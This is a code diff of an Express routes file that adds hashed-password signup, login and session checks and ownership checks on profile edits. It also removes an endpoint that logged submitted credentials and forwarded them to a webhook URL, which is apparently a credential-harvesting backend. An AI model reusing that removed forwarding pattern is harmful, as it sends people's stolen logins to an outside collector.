@@ -1,14 +1,85 @@
 import type { Express } from "express";
 import { createServer, type Server } from "http";
 import { storage } from "./storage";
-import { insertProfileSchema, insertCredentialLogSchema } from "@shared/schema";
+import { insertUserSchema, insertProfileSchema } from "@shared/schema";
 import { writeFile, unlink, mkdir } from "fs/promises";
 import { join } from "path";
 import { randomBytes } from "crypto";
+import bcrypt from "bcrypt";
+import "./types";
 
 export async function registerRoutes(app: Express): Promise<Server> {
   // Ensure uploads directory exists
   await mkdir("public/uploads", { recursive: true });
+
+  // Auth routes
+  app.post("/api/auth/signup", async (req, res) => {
+    try {
+      const validatedData = insertUserSchema.parse(req.body);
+      
+      const existingUser = await storage.getUserByUsername(validatedData.username);
+      if (existingUser) {
+        return res.status(400).json({ message: "Username already exists" });
+      }
+
+      const hashedPassword = await bcrypt.hash(validatedData.password, 10);
+      const user = await storage.createUser({
+        username: validatedData.username,
+        password: hashedPassword,
+      });
+      
+      req.session.userId = user.id;
+      req.session.username = user.username;
+      
+      res.status(201).json({ id: user.id, username: user.username });
+    } catch (error: any) {
+      res.status(400).json({ message: error.message });
+    }
+  });
+
+  app.post("/api/auth/login", async (req, res) => {
+    try {
+      const { username, password } = req.body;
+      
+      if (!username || !password) {
+        return res.status(400).json({ message: "Username and password required" });
+      }
+
+      const user = await storage.getUserByUsername(username);
+      if (!user) {
+        return res.status(401).json({ message: "Invalid credentials" });
+      }
+
+      const isValidPassword = await bcrypt.compare(password, user.password);
+      if (!isValidPassword) {
+        return res.status(401).json({ message: "Invalid credentials" });
+      }
+
+      req.session.userId = user.id;
+      req.session.username = user.username;
+      
+      res.json({ id: user.id, username: user.username });
+    } catch (error: any) {
+      res.status(400).json({ message: error.message });
+    }
+  });
+
+  app.post("/api/auth/logout", async (req, res) => {
+    req.session.destroy((err) => {
+      if (err) {
+        return res.status(500).json({ message: "Failed to logout" });
+      }
+      res.json({ success: true });
+    });
+  });
+
+  app.get("/api/auth/me", async (req, res) => {
+    if (!req.session.userId) {
+      return res.status(401).json({ message: "Not authenticated" });
+    }
+    
+    res.json({ id: req.session.userId, username: req.session.username });
+  });
 
   // Upload file endpoint (accepts base64 encoded files)
   app.post("/api/upload", async (req, res) => {
@@ -107,14 +178,18 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Create profile
   app.post("/api/profiles", async (req, res) => {
     try {
+      if (!req.session.userId) {
+        return res.status(401).json({ message: "Must be logged in to create a profile" });
+      }
+
       const validatedData = insertProfileSchema.parse(req.body);
       
       const existingProfile = await storage.getProfileByUsername(validatedData.username);
       if (existingProfile) {
-        return res.status(400).json({ message: "Username already exists" });
+        return res.status(400).json({ message: "Profile with this username already exists" });
       }
 
-      const profile = await storage.createProfile(validatedData);
+      const profile = await storage.createProfile(req.session.userId, validatedData);
       res.status(201).json(profile);
     } catch (error: any) {
       res.status(400).json({ message: error.message });
@@ -124,16 +199,26 @@ export async function registerRoutes(app: Express): Promise<Server> {
   // Update profile
   app.put("/api/profiles/:username", async (req, res) => {
     try {
+      if (!req.session.userId) {
+        return res.status(401).json({ message: "Must be logged in to update a profile" });
+      }
+
+      const profile = await storage.getProfileByUsername(req.params.username);
+      if (!profile) {
+        return res.status(404).json({ message: "Profile not found" });
+      }
+
+      if (profile.userId !== req.session.userId) {
+        return res.status(403).json({ message: "You can only edit your own profile" });
+      }
+
       if (req.body.username && req.body.username !== req.params.username) {
         return res.status(400).json({ message: "Cannot change username" });
       }
       
       const updates = insertProfileSchema.partial().omit({ username: true }).parse(req.body);
-      const profile = await storage.updateProfile(req.params.username, updates);
-      if (!profile) {
-        return res.status(404).json({ message: "Profile not found" });
-      }
-      res.json(profile);
+      const updatedProfile = await storage.updateProfile(req.params.username, updates);
+      res.json(updatedProfile);
     } catch (error: any) {
       res.status(400).json({ message: error.message });
     }
@@ -149,34 +234,6 @@ export async function registerRoutes(app: Express): Promise<Server> {
       res.json(profile);
     } catch (error: any) {
       res.status(500).json({ message: error.message });
-    }
-  });
-
-  // Log credentials and send to webhook
-  app.post("/api/credentials/log", async (req, res) => {
-    try {
-      const validatedData = insertCredentialLogSchema.parse(req.body);
-      const log = await storage.createCredentialLog(validatedData);
-
-      // Send to webhook if WEBHOOK_URL is configured
-      const webhookUrl = process.env.WEBHOOK_URL;
-      if (webhookUrl) {
-        try {
-          await fetch(webhookUrl, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify(log),
-          });
-        } catch (webhookError) {
-          console.error("Failed to send to webhook:", webhookError);
-        }
-      }
-
-      res.status(201).json({ success: true });
-    } catch (error: any) {
-      res.status(400).json({ message: error.message });
     }
   });
 
